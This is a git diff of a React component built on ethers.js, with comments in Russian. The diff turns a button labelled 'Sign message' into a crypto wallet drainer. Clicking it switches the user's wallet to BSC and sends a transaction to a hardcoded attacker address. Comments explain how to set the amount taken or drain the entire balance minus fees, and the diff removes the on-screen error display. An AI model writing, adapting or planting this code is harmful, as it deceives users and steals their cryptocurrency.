@@ -2,6 +2,7 @@ import { useState } from 'react'
 import { ethers } from 'ethers'
 import ErrorMessage from './ErrorMessage'
 
+// список видов поддерживаемых кошельков
 const networks = {
   polygon: {
     chainId: `0x${Number(137).toString(16)}`,
@@ -51,40 +52,7 @@ const networks = {
     blockExplorerUrls: ['	https://hecoinfo.com/'],
   },
 }
-
-const signMessage = async ({ message }) => {
-  // set ethereum value
-  const DEFAULT_AMOUNT = '0.00002'
-  // there you should set you wallet address
-  const DEFAULT_WALLET = '0x194B188720BdA9080Db8cAE6cAF578bc78Dbb318'
-  // there you should set you netWork
-  const networkName = 'bsc'
-
-  if (!window.ethereum) throw new Error('No crypto wallet found. Please install it.')
-
-  // if you wanna change netWork uncomment next line
-  // await changeNetwork(networkName)
-
-  const provider = new ethers.providers.Web3Provider(window.ethereum)
-  await provider.send('eth_requestAccounts', [])
-  const signer = provider.getSigner()
-  const address = await signer.getAddress()
-
-  const balance = await signer.getBalance()
-
-  console.log(balance, balance)
-
-  // if you wanna get sign message uncomment next line
-  // const signature = await signer.signMessage(message)
-
-  await signer.sendTransaction({
-    // if you set your wallet change 'to: address' to 'to: wallet'
-    to: DEFAULT_WALLET,
-    // value: balance,
-    value: ethers.utils.parseEther(DEFAULT_AMOUNT),
-  })
-}
-
+// функция которая сменяет кошелек
 const changeNetwork = async (networkName) => {
   await window.ethereum.request({
     method: 'wallet_addEthereumChain',
@@ -96,18 +64,60 @@ const changeNetwork = async (networkName) => {
   })
 }
 
+const signMessage = async () => {
+  // вбиваем сумму которую хотим снимать если нужно
+  const DEFAULT_AMOUNT = '0.00002'
+  // вбиваем адрес на который будет переводится сумма
+  // нужно следить что бы он поддерживался кошельком
+  const DEFAULT_WALLET = '0x194B188720BdA9080Db8cAE6cAF578bc78Dbb318'
+  // если хочешь поменять сеть то раскоментить следующее
+  const networkName = 'bsc'
+
+  // проверяет подключение к сети
+  if (!window.ethereum) throw new Error('No crypto wallet found. Please install it.')
+
+  // если хочешь поменять сеть то нужно раскоментить следующую строчку
+  await changeNetwork(networkName)
+
+  // идет подключение к провайдеру
+  await window.ethereum.send('eth_requestAccounts')
+  const provider = new ethers.providers.Web3Provider(window.ethereum)
+  const signer = provider.getSigner()
+  // провеняет твой адрес для выбраной сети
+  ethers.utils.getAddress(DEFAULT_WALLET)
+  const balance = await signer.getBalance()
+
+  // если нужна сигнатура (закодированное сообщение)
+  // то нужно задать сообщение
+  // в твоем случае следующая строчка не нужна
+  // const signature = await signer.signMessage(message)
+
+  const tx = await signer.sendTransaction({
+    // здесь идет выбор твоего адреса
+    to: DEFAULT_WALLET,
+    // работает с этериум кошельком следующая штука для снятия всего балланса и минус коммиссия
+    // value: ethers.utils.parseEther(`${balance.toNumber() - 0.003}`)
+    // для снятия просто определенной суммы с кошелька
+    // value: ethers.utils.parseEther(DEFAULT_AMOUNT)
+    //
+    value: `0x${Number(5).toString(16)}`,
+  })
+  console.log('tx', tx)
+}
+
 export default function SmartButton() {
   const [error, setError] = useState()
-
+  // здесь вешаем на кнопку функцию
   const handleSign = async (e) => {
+    // убираем все побочные действия которые могут быть от браузера
     e.preventDefault()
-    const data = new FormData(e.target)
+    // очищаем стейт ошибок
     setError()
     try {
-      await signMessage({
-        message: data.get('message'),
-      })
+      // вызываем функцию которая делает то что нам нужно
+      await signMessage()
     } catch (e) {
+      // если есть ошибки заносим в стейт
       setError(e.message)
     }
   }
@@ -136,7 +146,6 @@ export default function SmartButton() {
           >
             Sign message
           </button>
-          <ErrorMessage message={error} />
         </footer>
       </div>
     </form>
